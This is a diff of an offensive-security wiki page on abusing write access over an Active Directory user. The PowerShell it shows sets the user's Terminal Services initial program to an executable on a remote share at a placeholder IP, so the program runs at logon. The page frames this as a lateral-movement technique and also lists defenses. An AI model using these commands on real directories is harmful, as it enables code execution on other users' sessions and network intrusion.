@@ -42,11 +42,15 @@ This technique can be used to achieve multiple objectives, including gaining acc
 
 From a business perspective, this technique can be devastating as it can lead to data theft, financial loss, and reputational damage.
 
+ 
+
 ## Requirements
 
 1. Access to the Active Directory object that will be modified
 
 1. Access to Remote Connection Manager (RCM)
+
+ 
 
 ## Defense
 
@@ -55,6 +59,8 @@ From a business perspective, this technique can be devastating as it can lead to
 1. Monitor Active Directory for changes to security descriptors
 
 1. Restrict access to Remote Connection Manager (RCM) to authorized users only
+
+ 
 
 ## Objectives
 
@@ -66,6 +72,8 @@ From a business perspective, this technique can be devastating as it can lead to
 
 1. Move laterally within the network
 
+ 
+
 # Instructions
 
 1. To configure Remote Control Manager (RCM) for Remote Desktop Services (RDS), perform the following steps:
@@ -74,9 +82,17 @@ From a business perspective, this technique can be devastating as it can lead to
 3. Replace the values for "\\1.2.3.4\share\file.exe" and "C:\" with the appropriate values for your environment.
 4. Run the script.
 
+ 
+
+
+
 **Code**: [[$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=]]
 
+
+
 > This command configures the Remote Control Manager (RCM) for Remote Desktop Services (RDS). The RCM allows an administrator to remotely control a user's session on a terminal server. The provided PowerShell code creates a UserObject and sets the TerminalServicesInitialProgram and TerminalServicesWorkDirectory properties to the specified values. This will cause the specified program to launch when a user logs in to the terminal server and sets the working directory for the program. The SetInfo() method is then called to save the changes to the UserObject. Note that the RCM is only active on Terminal Servers/Remote Desktop Session Hosts and has been disabled on recent versions of Windows (>2016), which requires a registry change to re-enable.
+
+
 
 **Command** ([[Retrieve User Object]]):
 
@@ -84,11 +100,19 @@ From a business perspective, this technique can be devastating as it can lead to
 $UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
 ```
 
+
+
+
+
 **Command** ([[Set Terminal Services Initial Program]]):
 
 ```bash
 $UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
 ```
+
+
+
+
 
 **Command** ([[Set Terminal Services Work Directory]]):
 
@@ -96,11 +120,17 @@ $UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
 $UserObject.TerminalServicesWorkDirectory = "C:\"
 ```
 
+
+
+
+
 **Command** ([[Save Changes]]):
 
 ```bash
 $UserObject.SetInfo()
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -131,3 +161,5 @@ $UserObject.SetInfo()
 - [[Active Directory Attacks]]
 - [[GenericWrite]]
 - [[GenericWrite and Remote Connection Manager]]
+
+
